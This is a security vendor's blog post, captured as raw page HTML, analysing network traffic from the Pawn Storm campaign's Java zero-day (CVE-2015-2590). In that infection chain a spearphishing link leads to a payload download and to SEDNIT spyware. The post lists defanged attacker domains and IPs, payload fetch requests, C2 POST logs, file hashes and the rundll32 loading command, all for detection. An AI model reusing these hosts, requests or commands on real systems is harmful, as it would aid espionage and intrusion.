})(window,document,'script','dataLayer','GTM-T8DW3SL');</script>
<!-- End Google Tag Manager -->
<link href="https://www.trendmicro.com/vinfo/cloudlink/styles/ransomware-solutions-blog-template-style.css" rel="stylesheet" type="text/css">
<style>
#disqus_thread #dsq-app5 {
    display: none !important;
}

#disqus_thread #dsq-app4{
   display: none !important;
}
div#ransomwareSolutionContainer sup {
    vertical-align: super !important;
    font-size: 7px !important;
}
.RW_icon img {
    width: 100%;
    display: none;
}

.aligncenter {
    margin: 0 auto !important;
}

</style>
<!-- Start VWO Asynchronous Code -->
<script type='text/javascript'>
var _vwo_code=(function(){
var account_id=215154,
settings_tolerance=2000,
library_tolerance=2500,
use_existing_jquery=false,
/* DO NOT EDIT BELOW THIS LINE */
f=false,d=document;return{use_existing_jquery:function(){return use_existing_jquery;},library_tolerance:function(){return library_tolerance;},finish:function(){if(!f){f=true;var a=d.getElementById('_vis_opt_path_hides');if(a)a.parentNode.removeChild(a);}},finished:function(){return f;},load:function(a){var b=d.createElement('script');b.src=a;b.type='text/javascript';b.innerText;b.onerror=function(){_vwo_code.finish();};d.getElementsByTagName('head')[0].appendChild(b);},init:function(){settings_timer=setTimeout('_vwo_code.finish()',settings_tolerance);var a=d.createElement('style'),b='body{opacity:0 !important;filter:alpha(opacity=0) !important;background:none !important;}',h=d.getElementsByTagName('head')[0];a.setAttribute('id','_vis_opt_path_hides');a.setAttribute('type','text/css');if(a.styleSheet)a.styleSheet.cssText=b;else a.appendChild(d.createTextNode(b));h.appendChild(a);this.load('//dev.visualwebsiteoptimizer.com/j.php?a='+account_id+'&u='+encodeURIComponent(d.URL)+'&r='+Math.random());return settings_timer;}};}());_vwo_settings_timer=_vwo_code.init();
</script>
<!-- End VWO Asynchronous Code -->
        <script type="text/javascript">
            var jQueryMigrateHelperHasSentDowngrade = false;

			window.onerror = function( msg, url, line, col, error ) {
				// Break out early, do not processing if a downgrade reqeust was already sent.
				if ( jQueryMigrateHelperHasSentDowngrade ) {
					return true;
                }

				var xhr = new XMLHttpRequest();
				var nonce = '4c4e482baa';
				var jQueryFunctions = [
					'andSelf',
					'browser',
					'live',
					'boxModel',
					'support.boxModel',
					'size',
					'swap',
					'clean',
					'sub',
                ];
				var match_pattern = /\)\.(.+?) is not a function/;
                var erroredFunction = msg.match( match_pattern );

                // If there was no matching functions, do not try to downgrade.
                if ( typeof erroredFunction !== 'object' || typeof erroredFunction[1] === "undefined" || -1 === jQueryFunctions.indexOf( erroredFunction[1] ) ) {
                    return true;
                }

                // Set that we've now attempted a downgrade request.
                jQueryMigrateHelperHasSentDowngrade = true;

				xhr.open( 'POST', 'https://blog.trendmicro.com/trendlabs-security-intelligence/wp-admin/admin-ajax.php' );
				xhr.setRequestHeader( 'Content-Type', 'application/x-www-form-urlencoded' );
				xhr.onload = function () {
					var response,
                        reload = false;

					if ( 200 === xhr.status ) {
                        try {
                        	response = JSON.parse( xhr.response );

                        	reload = response.data.reload;
                        } catch ( e ) {
                        	reload = false;
                        }
                    }

					// Automatically reload the page if a deprecation caused an automatic downgrade, ensure visitors get the best possible experience.
					if ( reload ) {
						location.reload();
                    }
				};

				xhr.send( encodeURI( 'action=jquery-migrate-downgrade-version&_wpnonce=' + nonce ) );

				// Suppress error alerts in older browsers
				return true;
			}
        </script>

				<style type="text/css" id="wp-custom-css">
			/*
You can add your own CSS here.

Click the help icon above to learn more.
*/


.frs-caption-content p:nth-child(2) {
    display: block !important;
}

.frs-caption-content p:nth-child(3) {
    display: block !important;
}		</style>
		</head>
<body class="post-template-default single single-post postid-68930 single-format-standard">

<!-- Loading script asynchronously -->
<script type="text/javascript">
 (function(a,b,c,d){
 a='//tags.tiqcdn.com/utag/trendmicro/nabu/prod/utag.js';
 b=document;c='script';d=b.createElement(c);d.src=a;d.type='text/java'+c;d.async=true;
 a=b.getElementsByTagName(c)[0];a.parentNode.insertBefore(d,a);
 })();
</script>
<!-- END: T-WP -->

	<div id="backgroundImage"></div>
	<div id="backgroundPattern"></div>
	
		<div id="topBorder"></div>
	<div class="clear"></div>
		
	
		<div id="preHeader">
		<div id="preHeaderContent">
			<div id="preHeaderLeft">
				<div id="nav_menu-2" class="widget widget_nav_menu"><div class="menu-header-container"><ul id="menu-header" class="menu"><li id="menu-item-70641" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-70641"><a href="https://www.trendmicro.com">Trend Micro</a></li>
<li id="menu-item-70642" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-70642"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/about-us/">About TrendLabs Security Intelligence Blog</a></li>
</ul></div></div><div class="clear"></div>				<div class="clear"></div>
			</div>
			<div id="preHeaderRight">
				<div id="preHeaderRightContent">
										<div class="clear"></div>
				</div>
			</div>
			<div class="clear"></div>
		</div>
	</div>
	
	<div id="wrapper">

		<div id="contentWrapper">
			
			<div id="header">
			
								<div id="headerSocial">
					<ul class="socialIcons">
														<li><a href="https://twitter.com/trendmicrorsrch" target="_blank" rel="nofollow"><img   src="https://documents.trendmicro.com/images/TEx/blogicons/twitter.jpg" alt="" /></a></li>
																					<li><a href="http://www.facebook.com/trendmicro" target="_blank" rel="nofollow"><img   src="https://documents.trendmicro.com/images/TEx/blogicons/fb.jpg" alt="" /></a></li>
																					<li><a href="http://www.linkedin.com/company/trend-micro" target="_blank" rel="nofollow"><img   src="https://documents.trendmicro.com/images/TEx/blogicons/in.jpg" alt="" /></a></li>
																					<li><a href="http://www.youtube.com/user/TrendMicroInc" target="_blank" rel="nofollow"><img   src="https://documents.trendmicro.com/images/TEx/blogicons/youtube.jpg" alt="" /></a></li>
																					<li><a href="http://feeds.trendmicro.com/Anti-MalwareBlog" target="_blank" rel="nofollow"><img   src="https://documents.trendmicro.com/images/TEx/blogicons/rss.jpg" alt="" /></a></li>
																			</ul>
				</div>
				<div class="clear"></div>
								
				
				<div id="horizontalLogo">
												<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/"><img id="imageLogo" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/10/blog-logo-2018.jpg" alt="" /></a>
										</div>
				
								<div id="headerSearch">
					<div id="searchWrap">
													<div class="searchCaption">
								<span class="searchTitle">Search:</span>
							</div>
												<div class="headerSearchBox">
							<div>
								<div id="headerSearchDiv" style="padding-right:0px;">
									<form role="search" method="get" action="https://blog.trendmicro.com/trendlabs-security-intelligence">
										<input name="s" id="headerSearchField" title="Search Site" value="" onclick="this.value = '';" style="opacity: 0; ">
										<input id="headerSearchSubmit" type="submit" value="">
									</form>
								</div>
							</div>
						</div>
					</div>
				</div>
									<label class="custom-select">
					<select id="menu-home" class="mobile-menu dropdown-menu"><option value="" class="blank">Go to&#8230;</option><option class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-70643 menu-item-depth-0" value="http://blog.trendmicro.com/trendlabs-security-intelligence/">Home</option>
<option class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-70644 menu-item-depth-0" value="#">Categories</option>	<option class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-73632 menu-item-depth-1" value="https://blog.trendmicro.com/trendlabs-security-intelligence/category/ransomware/">- &nbsp;&nbsp;Ransomware</option>
	<option class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-70648 menu-item-depth-1" value="https://blog.trendmicro.com/trendlabs-security-intelligence/category/vulnerabilities/">- &nbsp;&nbsp;Vulnerabilities</option>
	<option class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-70650 menu-item-depth-1" value="https://blog.trendmicro.com/trendlabs-security-intelligence/category/exploits/">- &nbsp;&nbsp;Exploits</option>
	<option class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-70651 menu-item-depth-1" value="https://blog.trendmicro.com/trendlabs-security-intelligence/category/targeted_attacks/">- &nbsp;&nbsp;Targeted Attacks</option>
	<option class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-71451 menu-item-depth-1" value="https://blog.trendmicro.com/trendlabs-security-intelligence/category/deep-web/">- &nbsp;&nbsp;Deep Web</option>
	<option class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-70649 menu-item-depth-1" value="https://blog.trendmicro.com/trendlabs-security-intelligence/category/mobile/">- &nbsp;&nbsp;Mobile</option>
	<option class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-70654 menu-item-depth-1" value="https://blog.trendmicro.com/trendlabs-security-intelligence/category/internet-of-things/">- &nbsp;&nbsp;Internet of Things</option>
	<option class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-70646 menu-item-depth-1" value="https://blog.trendmicro.com/trendlabs-security-intelligence/category/malware/">- &nbsp;&nbsp;Malware</option>
	<option class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-70645 menu-item-depth-1" value="https://blog.trendmicro.com/trendlabs-security-intelligence/category/bad-websites/">- &nbsp;&nbsp;Bad Sites</option>
	<option class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-70647 menu-item-depth-1" value="https://blog.trendmicro.com/trendlabs-security-intelligence/category/spam/">- &nbsp;&nbsp;Spam</option>
	<option class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-70652 menu-item-depth-1" value="https://blog.trendmicro.com/trendlabs-security-intelligence/category/botnets/">- &nbsp;&nbsp;Botnets</option>
	<option class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-70653 menu-item-depth-1" value="https://blog.trendmicro.com/trendlabs-security-intelligence/category/social-media/">- &nbsp;&nbsp;Social</option>
	<option class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-71452 menu-item-depth-1" value="https://blog.trendmicro.com/trendlabs-security-intelligence/category/open-source/">- &nbsp;&nbsp;Open source</option>

</select>					</label>
								
				<div id="navWrap">
					<div id="horizontalNavigation">
						<ul id="menu-home-1" class="sf-menu clearfix"><li id="menu-item-70643" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home"><a href="http://blog.trendmicro.com/trendlabs-security-intelligence/">Home</a></li>
<li id="menu-item-70644" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children"><a href="#">Categories</a>
<ul class="sub-menu">
<div class="col">
	<li id="menu-item-73632" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/category/ransomware/">Ransomware</a></li>
	<li id="menu-item-70648" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/category/vulnerabilities/">Vulnerabilities</a></li>
	<li id="menu-item-70650" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/category/exploits/">Exploits</a></li>
	<li id="menu-item-70651" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/category/targeted_attacks/">Targeted Attacks</a></li>
	<li id="menu-item-71451" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/category/deep-web/">Deep Web</a></li>
	<li id="menu-item-70649" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/category/mobile/">Mobile</a></li>
	<li id="menu-item-70654" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/category/internet-of-things/">Internet of Things</a></li>
	<li id="menu-item-70646" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/category/malware/">Malware</a></li>
	<li id="menu-item-70645" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/category/bad-websites/">Bad Sites</a></li>
	<li id="menu-item-70647" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/category/spam/">Spam</a></li>
	<li id="menu-item-70652" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/category/botnets/">Botnets</a></li>
	<li id="menu-item-70653" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/category/social-media/">Social</a></li>
	<li id="menu-item-71452" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/category/open-source/">Open source</a></li>
</div>
<div class="clear"></div></ul>
</li>
</ul> 
					<div class="clear"></div>
					</div>
					<div class="clear"></div>
				</div>
				<div class="clear"></div>
				
			</div>
			<div class="clear"></div>			<div id="innerWrap" class= "rightSideBar">
							
				<div id="content" class= "rightSideBar">
					<div id="pageContent">
						  <div id="crumbsOnly">
    <div id="breadcrumbs"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/" class="breadcrumbs-begin">Home</a> <span class="breadcrumbs-separator">&nbsp;&nbsp;&raquo;&nbsp;&nbsp;</span> <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/category/exploits/" title="Exploits">Exploits</a> <span class="breadcrumbs-separator">&nbsp;&nbsp;&raquo;&nbsp;&nbsp;</span> An In-Depth Look at How Pawn Storm‚Äôs Java Zero-Day Was Used</div>  </div>
  <div id="post-68930" class="post-68930 post type-post status-publish format-standard hentry category-exploits category-malware category-targeted_attacks tag-apt28 tag-cve-2015-2590 tag-java-zero-day tag-pawn-storm tag-targeted-attack">
    <div class="post-head">
      <div class="post-title">
        <h1>An In-Depth Look at How Pawn Storm‚Äôs Java Zero-Day Was Used</h1>
      </div>
    </div>
    <div class="clear"></div>
          <div class="post-meta">
        <ul>
          <li class="post-date">
            <div class="meta-info">
              Posted on:<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/2015/07/">July 14, 2015</a> <span class="normalText">at 9:29 pm</span>
            </div>
            <div class="clear"></div>
          </li>
          <li class="post-cat">
            <div class="meta-info">
              Posted in:<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/category/exploits/" rel="category tag">Exploits</a>, <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/category/malware/" rel="category tag">Malware</a>, <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/category/targeted_attacks/" rel="category tag">Targeted Attacks</a>            </div>
            <div class="clear"></div>
          </li>
          <li class="post-user">
            <div class="meta-info">
              Author:<div class="author-name-red">
<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/author/trend-micro/" title="Posts by Trend Micro" rel="author">Trend Micro</a></div>
            </div>
            <div class="clear"></div>
          </li>
        </ul>
      </div>
      <div class="clear"></div>
          <div class="post-comments">
                  <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/an-in-depth-look-at-how-pawn-storms-java-zero-day-was-used/#comments">
								<span class="meta-comments">
									2								</span>
          </a>
              </div><!--  CLOSE post-comments -->
    
    <div class="post-text">
      <div style='display:none;' class='shareaholic-canvas' data-app='share_buttons' data-title='An In-Depth Look at How Pawn Storm‚Äôs Java Zero-Day Was Used' data-link='https://blog.trendmicro.com/trendlabs-security-intelligence/an-in-depth-look-at-how-pawn-storms-java-zero-day-was-used/' data-app-id-name='post_above_content'></div>
<p>Operation Pawn Storm is a campaign known to target military, embassy, and defense contractor personnel from the United States and its allies. The attackers behind Operation Pawn Storm have been active since at least 2007 and they continue to launch new campaigns.</p>
<p>Over the past year or so, we have seen numerous techniques and tactics employed by this campaign, such as the use of <a href="http://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-update-ios-espionage-app-found/">an iOS espionage app</a>, and the inclusion of new targets like <a href="http://blog.trendmicro.com/trendlabs-security-intelligence/operation-pawn-storm-ramps-up-its-activities-targets-nato-white-house/">the White House</a>. Through our on-going investigation and monitoring of this targeted attack campaign, we found suspicious URLs that hosted a newly discovered zero-day exploit in Java now identified by Oracle as <a onclick="javascript:pageTracker._trackPageview('/outgoing/blogs.oracle.com/security/entry/july_2015_critical_patch_update');"  href="https://blogs.oracle.com/security/entry/july_2015_critical_patch_update">CVE-2015-2590</a>. This is the first time in nearly two years that a <a href="http://blog.trendmicro.com/trendlabs-security-intelligence/java-6-zero-day-exploit-pushes-users-to-shift-to-latest-java-version/">new Java zero-day vulnerability</a> was reported.</p>
<p><em>The report below outlines the traffic observed as part of the attack, not the exploit itself. Our¬†blog entry on how the exploit itself works can be found <a href="http://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-update-trend-micro-discovers-new-java-zero-day-exploit/">here</a>. This blog entry¬†is intended to help readers identify traffic in their network that would indicate if such an exposure had occurred. We strongly recommend that all readers roll out the¬†<a onclick="javascript:pageTracker._trackPageview('/outgoing/blogs.oracle.com/security/entry/july_2015_critical_patch_update');"  href="https://blogs.oracle.com/security/entry/july_2015_critical_patch_update"><em>Oracle patch</em></a></em><em>¬†as soon as possible</em></p>
<p><strong><em>Infection sequence</em></strong></p>
<p>Trend Micro has observed that an entity belonging to the target profile received an email that contains the following URL:</p>
<ul>
<li>hxxp://ausameetings[.]com/url?={BLOCKED}/2015annualmeeting/</li>
</ul>
<p>It is worth noting that the spearphishing domain used is <em>ausameetings[.]com</em>, a play on the valid domain ‚Äúausameetings.org,‚Äù which is a site for AUSA‚Äôs (Association of the United States Army) annual exposition, commonly held in mid-October. The domain was only registered last July 8, which implies a one-time use for a specific set of targets.</p>
<p>When assessing this URL, it was determined that the most probable infection sequence is:</p>
<p align="center"><img src="http://blog.trendmicro.com/trendlabs-security-intelligence/files/2015/07/pawnstorm.png" alt="" /></p>
<p align="center"><i>Figure 1. Infection chain</i></p>
<p>Like all multi-stage infections, a successful execution of the previous stage is required before moving to the next stage down. In Stage 1, the sequence is initiated by clicking on the URL embedded within the victim‚Äôs spearphishing email.</p>
<p>Once the Java exploit of Stage 1 is successful, it downloads the PE file (Stage 2).¬†Once the PE file is downloaded and executed it drops and runs the DLL file (Stage 3) which is the final component to infect the machine with SEDNIT.</p>
<p>The information that we have on each of these steps is as follows.<br />
Further information on each of these stages can be found in the sections below.</p>
<table border="1">
<tbody>
<tr>
<td><strong>Stage</strong></td>
<td><strong>Type</strong></td>
<td><strong>SHA1</strong></td>
<td><strong>File Name</strong></td>
<td><strong>File Size</strong></td>
<td><strong>Trend Micro Detection</strong></td>
</tr>
<tr>
<td>Stage 1</td>
<td>Java Exploit</td>
<td>95dc765700f5af406883<br />
d07f165011d2ff8dd0fb</td>
<td>Spearphishing URL matching hxxp://ausameetings[.]com/url?=[a-zA-Z0-9]{7}/2015annualmeeting/</td>
<td></td>
<td>JAVA_DLOADR.EFD</td>
</tr>
<tr>
<td>Stage 2</td>
<td>PE</td>
<td>b4a515ef9de037f18d96<br />
b9b0e48271180f5725b7</td>
<td>Drops as <em>cormac.mcr<br />
</em><br />
End resulting file on host system as <em>vhgg5hkvn25.exe</em></td>
<td>1,619,968 bytes</td>
<td>TROJ_DROPPR.CXC</td>
</tr>
<tr>
<td>Stage 3</td>
<td>DLL</td>
<td>21835aafe6d46840bb69<br />
7e8b0d4aac06dec44f5b</td>
<td>api-ms-win-downlevel-profile-l1-1-0.dll</td>
<td>40,960 bytes</td>
<td><a onclick="javascript:pageTracker._trackPageview('/outgoing/www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/TSPY_SEDNIT.C');"  href="http://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/TSPY_SEDNIT.C">TSPY_SEDNIT.C</a></td>
</tr>
</tbody>
</table>
<p><strong><em>Stage 1 ‚Äì the Java exploit</em></strong></p>
<p>The first stage of the infection sequence comes through a targeted, spearphishing attempt against the victim, which is the <a onclick="javascript:pageTracker._trackPageview('/outgoing/www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-operation-pawn-storm.pdf');"  href="http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-operation-pawn-storm.pdf">observed method for Operation Pawn Storm</a> attacks.</p>
<p>The initial spearphishing URL is constructed similar to:</p>
<ul>
<li>hxxp://ausameetings[.]com/url?=[a-zA-Z0-9]{7}/2015annualmeeting/</li>
</ul>
<p>The web pages on this domain that were found to drop the Java zero-day exploit include:</p>
<ul>
<li>1_2015annualmeeting index.htm (19,225 bytes) &#8211; detected as HTML_JNLPER.HAQ</li>
<li>3_544306 index.htm (4,077 bytes) &#8211; detected as¬†HTML_JNLPER.HAQ</li>
</ul>
<p>The network traffic observed for the infection sequence of this stage is:</p>
<ol>
<li>Send the initial POST as per the spearphishing email to ausameetings[.]com, which includes the <em>2015annualmeeting</em> URI path.</li>
<li>Send an encoded POST call, which, when decoded, is the variable to construct the subsequently used URI path. This is particularly interesting as it appears that each URI path on the malicious server is customized by the victim‚Äôs infection, rather than static on the web server.</li>
<li>The victim machine then does a variety of GET calls to pull down JPG, JNLP, and Java class files.</li>
<li>If the Java class files cannot be found on the primarily domain (<em>ausameetings[.]com</em>), it appears to instead attempt to get these files from a hardcoded IP (<em>87[.]236[.]215[.]132</em>).</li>
<li>Once the class files are downloaded, the victim machine then does a GET call to fetch the file <em>cormac.</em><em>mcr</em>. This file is the PE file for Stage 2.</li>
</ol>
<p>For completeness, the specific traffic calls observed relating to Stage 1 include the following:</p>
<table border="1">
<thead>
<tr>
<td><strong>Result</strong></td>
<td><strong>Protocol</strong></td>
<td><strong>Host</strong></td>
<td><strong>URL</strong></td>
<td><strong>Size</strong></td>
<td><strong>Content-Type</strong></td>
</tr>
</thead>
<tbody>
<tr>
<td>200</td>
<td>HTTP</td>
<td>ausameetings[.]com</td>
<td>/url?={BLOCKED}/2015annualmeeting/</td>
<td>19,225</td>
<td>text/html; charset=utf-8</td>
</tr>
<tr>
<td>200</td>
<td>HTTP</td>
<td>ausameetings[.]com</td>
<td>/VFlmsRH/7311/4388/558923/?p2=KlW2HlMf&amp;c=<br />
BMjNiBV&amp;recr=Wr1mI7&amp;p3=364397021&amp;<br />
as=SAUmj&amp;c=GY9oCdQ&amp;</td>
<td>22</td>
<td>text/html; charset=utf-8</td>
</tr>
<tr>
<td>200</td>
<td>HTTP</td>
<td>ausameetings[.]com</td>
<td>/url/544036/</td>
<td>4,077</td>
<td>text/html; charset=utf-8</td>
</tr>
<tr>
<td>200</td>
<td>HTTP</td>
<td>ausameetings[.]com</td>
<td>/url/544036/line.jpg</td>
<td>22,500</td>
<td>text/html; charset=utf-8</td>
</tr>
<tr>
<td>200</td>
<td>HTTP</td>
<td>ausameetings[.]com</td>
<td>/url/544036/right.jpg</td>
<td>97,247</td>
<td>text/html; charset=utf-8</td>
</tr>
<tr>
<td>200</td>
<td>HTTP</td>
<td>ausameetings[.]com</td>
<td>/url/544036/init.jnlp</td>
<td>562</td>
<td>application/x-java-jnlp-file</td>
</tr>
<tr>
<td>200</td>
<td>HTTP</td>
<td>ausameetings[.]com</td>
<td>/url/544036/</td>
<td>4,077</td>
<td>text/html; charset=utf-8</td>
</tr>
<tr>
<td>200</td>
<td>HTTP</td>
<td>ausameetings[.]com</td>
<td>/url/544036/jndi.properties</td>
<td>125</td>
<td>text/html; charset=utf-8</td>
</tr>
<tr>
<td>404</td>
<td>HTTP</td>
<td>ausameetings[.]com</td>
<td>/url/544036/Go.class</td>
<td>0</td>
<td>text/html; charset=utf-8</td>
</tr>
<tr>
<td>200</td>
<td>HTTP</td>
<td>87[.]236[.]215[.]132</td>
<td>/2/Go.class</td>
<td>1,373</td>
<td>text/html; charset=utf-8</td>
</tr>
<tr>
<td>404</td>
<td>HTTP</td>
<td>87[.]236[.]215[.]132</td>
<td>/crossdomain.xml</td>
<td>0</td>
<td>text/html; charset=utf-8</td>
</tr>
<tr>
<td>200</td>
<td>HTTP</td>
<td>87[.]236[.]215[.]132</td>
<td>/2/App.class</td>
<td>7,552</td>
<td>text/html; charset=utf-8</td>
</tr>
<tr>
<td>200</td>
<td>HTTP</td>
<td>87[.]236[.]215[.]132</td>
<td>/2/Help.class</td>
<td>5,667</td>
<td>text/html; charset=utf-8</td>
</tr>
<tr>
<td>200</td>
<td>HTTP</td>
<td>87[.]236[.]215[.]132</td>
<td>/2/PhantomSuper.class</td>
<td>763</td>
<td>text/html; charset=utf-8</td>
</tr>
<tr>
<td>200</td>
<td>HTTP</td>
<td>87[.]236[.]215[.]132</td>
<td>/2/ArrayReplace.class</td>
<td>729</td>
<td>text/html; charset=utf-8</td>
</tr>
<tr>
<td>200</td>
<td>HTTP</td>
<td>87[.]236[.]215[.]132</td>
<td>/2/App$PassHandleController.class</td>
<td>980</td>
<td>text/html; charset=utf-8</td>
</tr>
<tr>
<td>200</td>
<td>HTTP</td>
<td>87[.]236[.]215[.]132</td>
<td>/2/Converter.class</td>
<td>2,820</td>
<td>text/html; charset=utf-8</td>
</tr>
<tr>
<td>200</td>
<td>HTTP</td>
<td>87[.]236[.]215[.]132</td>
<td>/2/MyByteArrayInputStream.class</td>
<td>1,282</td>
<td>text/html; charset=utf-8</td>
</tr>
<tr>
<td>404</td>
<td>HTTP</td>
<td>87[.]236[.]215[.]132</td>
<td>/2/pkg/None2.class</td>
<td>0</td>
<td>text/html; charset=utf-8</td>
</tr>
<tr>
<td>404</td>
<td>HTTP</td>
<td>87[.]236[.]215[.]132</td>
<td>/2/pkg/None.class</td>
<td>0</td>
<td>text/html; charset=utf-8</td>
</tr>
<tr>
<td>200</td>
<td>HTTP</td>
<td>ausameetings[.]com</td>
<td>/url/544036/cormac.mcr</td>
<td>1,619,968</td>
<td>application/octet-stream</td>
</tr>
</tbody>
</table>
<p>Trend Micro detects these Java class files as JAVA_DLOADR.EFD:</p>
<ul>
<li>App.class (7,552 bytes)</li>
<li>Go.class (1,373 bytes)</li>
<li>Help.class (5,667 bytes)</li>
</ul>
<p>The second and third traffic calls in the traffic pattern are particularly interesting to note.</p>
<p align="center"><a onclick="javascript:pageTracker._trackPageview('/downloads/trendlabs-security-intelligence/files/2015/07/pawnstorm-traffic-pattern1.png');"  href="http://blog.trendmicro.com/trendlabs-security-intelligence/files/2015/07/pawnstorm-traffic-pattern1.png"><img src="http://blog.trendmicro.com/trendlabs-security-intelligence/files/2015/07/pawnstorm-traffic-pattern-tb1.png" alt="" /></a><br />
<i>Figure 2. Traffic patterns (click the image to enlarge)</i></p>
<p>One can observe that the second call sends a POST to <em>ausumeetings[.]com</em>, and is returned with a text <em>responsecfa</em> that then subsequently is used as the URI path for the subsequent HTTP requests.</p>
<p><strong><em>Stage 2 ‚Äì The PE file</em></strong></p>
<p>Stage 2 involves downloading a PE file. Trend Micro detects this file as TROJ_DROPPR.CXC. The primary purpose of this PE is to drop and load the DLL executable.¬†It is downloaded as <em>Cormac.mcr</em>, but once extracted, the file name is converted into a randomized file name. It is installed into the¬†<em>%USERPROFILE%</em>¬†directory and then executed, creating a service by the same name.</p>
<p>During its installation, a variety of other services also appear to be hooked, including <em>lsass</em>, <em>lsm</em>, and<em>¬†</em><em>conhost</em>, amongst others.</p>
<p align="center"><a onclick="javascript:pageTracker._trackPageview('/downloads/trendlabs-security-intelligence/files/2015/07/pawnstorm-process.png');"  href="http://blog.trendmicro.com/trendlabs-security-intelligence/files/2015/07/pawnstorm-process.png"><img src="http://blog.trendmicro.com/trendlabs-security-intelligence/files/2015/07/pawnstorm-process-tb.png" alt="" /></a><br />
<i>Figure 3. Observed processes (click the image to enlarge)</i></p>
<p>Once the malware is executed, it will drop the Stage 3 DLL file with filename <em>api-ms-win-downlevel-profile-l1-1-0.dll</em> in the <em>%TEMP%</em> directory. To load the malware, it executes <em>rundll32.exe</em> using the following command:</p>
<ul>
<li>rundll32.exe ‚Äú%temp%/api-ms-win-downlevel-profile-l1-1-0.dll‚Äù,init</li>
</ul>
<p><strong><em>Stage 3 ‚Äì The DLL file</em></strong></p>
<p>This third stage involves a DLL file, which we detect as TSPY_SEDNIT.C. When the PE file triggers the DLL (in this instance, %windir%\system32\RunDll32.exe Command: &#8220;%windir%\system32\RunDll32.exe &#8221; &#8220;C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\ap i-ms-win-downlevel-profile-l1-1-0.dll&#8221;,init), the following traffic was observed.</p>
<table border="1">
<tbody>
<tr>
<td>1</td>
<td>POST /ESL/YxF8bM/f/MFS.pdf/?duJ=OJYKZRlzy1tddcpaKjU= HTTP/1.1<br />
Content-Type: application/x-www-form-urlencoded<br />
Host: www.google.com<br />
Content-Length: 0<br />
<em>Note: Assumed to be a local connectivity test traffic call.</em></td>
</tr>
<tr>
<td>2</td>
<td>POST /RGLw/ofEK/5w2a.htm/?6=9SpyZtTPs1iQybJZ54k= HTTP/1.1<br />
Content-Type: application/x-www-form-urlencoded<br />
Host: 192[.]111[.]146[.]185<br />
Content-Length: 830</td>
</tr>
<tr>
<td>3</td>
<td>POST /hP/Bo/S/2z.htm/?WDC=TJrXZm1/FlgpeRdZXjk= HTTP/1.1<br />
Content-Type: application/x-www-form-urlencoded<br />
Host: www.google.com<br />
Content-Length: 0<br />
<em>Note: Assumed to be a local connectivity test traffic call.</em></td>
</tr>
<tr>
<td>4</td>
<td>POST /C9zl/LJ9.zip/?hP=mLgAZ7ldwVn9W8BYihs= HTTP/1.1<br />
Content-Type: application/x-www-form-urlencoded<br />
Host: 192[.]111[.]146[.]185<br />
Content-Length: 0</td>
</tr>
<tr>
<td>5</td>
<td>POST /k9/eR3/a/UE/eR.pdf/?bKC=xCCmnuXFZ6Chw2ah1oM= HTTP/1.1<br />
Content-Type: application/x-www-form-urlencoded<br />
Host: 192[.]111[.]146[.]185<br />
Content-Length: 26</td>
</tr>
</tbody>
</table>
